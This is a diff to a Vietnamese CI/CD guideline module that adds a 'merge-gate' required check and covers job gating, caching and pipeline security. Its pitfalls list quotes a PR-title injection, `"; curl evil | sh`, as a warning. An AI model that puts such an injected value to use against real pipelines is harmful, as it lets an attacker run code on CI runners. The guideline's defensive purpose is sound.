@@ -3,12 +3,12 @@ title: CI/CD: job gate, required check, cache, bảo mật pipeline
 kind: module
 prefix: WF-CI
 applies_to: [all]
-updated: 2026-10-18
+updated: 2026-10-19
 ---
 
 # CI/CD: job gate, required check, cache, bảo mật pipeline
 
-> Pipeline là **hàng rào tập trung** (tầng 3): một job `quality` gom mọi cổng chất lượng làm required check chính (cùng `protection-guard`, `gitleaks` và `dep-audit`), chạy
+> Pipeline là **hàng rào tập trung** (tầng 3): một job `quality` gom mọi cổng chất lượng làm required check chính (cùng `protection-guard`, `gitleaks`, `dep-audit` và `merge-gate` — ADR-0023), chạy
 > lại mọi kiểm của hook local, nhanh nhờ cache, an toàn nhờ `permissions` tối thiểu + ghim SHA + không chạy code
 > lạ với quyền ghi. Ghim SHA/SBOM/provenance chi tiết ở [`../12-security/supply-chain.md`](../12-security/supply-chain.md);
 > chiến lược deploy ở [`../15-operations/deployment-strategies.md`](../15-operations/deployment-strategies.md).
@@ -31,7 +31,7 @@ updated: 2026-10-18
 
 | Câu hỏi | Chọn | Ghi chú |
 |---|---|---|
-| Cấu trúc workflow | `ci.yml`: job con (lint, type, test, build, scan…) → job `quality` `needs: [...]` kiểm `needs.*.result == 'success'` | Không thêm required check rời cho từng job con (ruleset lệch tên); ruleset giữ 3 tên cố định `quality`, `protection-guard`, `gitleaks`, `dep-audit` |
+| Cấu trúc workflow | `ci.yml`: job con (lint, type, test, build, scan…) → job `quality` `needs: [...]` kiểm `needs.*.result == 'success'` | Không thêm required check rời cho từng job con (ruleset lệch tên); ruleset giữ 5 tên cố định `quality`, `protection-guard`, `gitleaks`, `dep-audit`, `merge-gate` |
 | Trigger | `pull_request` + `push: branches: [main]` + `merge_group` (nếu merge queue) + `schedule` có offset phút | `pull_request_target` chỉ khi thật cần quyền và **không checkout code PR** |
 | Cache | `actions/setup-*` cache built-in theo lockfile; `actions/cache` cho browser/tool với key `hashFiles(lockfile)` | Cache theo nhánh/ngày (miss liên tục) |
 | Ghim action | Full commit SHA + comment version; Dependabot `github-actions` cập nhật | Tag `@v4` chỉ cho action chính chủ GitHub nếu chấp nhận rủi ro — ghi ADR |
@@ -67,7 +67,7 @@ updated: 2026-10-18
 
 ## Bẫy thường gặp
 
-- **Nhiều required check rời rạc.** Thêm/đổi tên job → ruleset lệch → nhánh khoá hoặc cổng hở. Một `quality` gom + `protection-guard` đối chiếu (cộng `gitleaks`).
+- **Nhiều required check rời rạc.** Thêm/đổi tên job → ruleset lệch → nhánh khoá hoặc cổng hở. Một `quality` gom + `protection-guard` đối chiếu (cộng `gitleaks`, `dep-audit`, `merge-gate`).
 - **CI "xanh rỗng".** Job skip khi chưa có `package.json` (khung cũ) hoặc `if:` sai → mọi thứ xanh mà không chạy gì. `quality` phải fail khi job con `skipped` ngoài quy tắc; smoke "cổng chặn được lỗi" ở G5.
 - **`pull_request_target` + checkout PR head.** PR từ fork chạy code lạ với secrets. Không checkout code PR trong trigger có quyền.
 - **Nội suy title PR vào `run:`.** Title `"; curl evil | sh` chạy trên runner. Qua `env:` và quote.
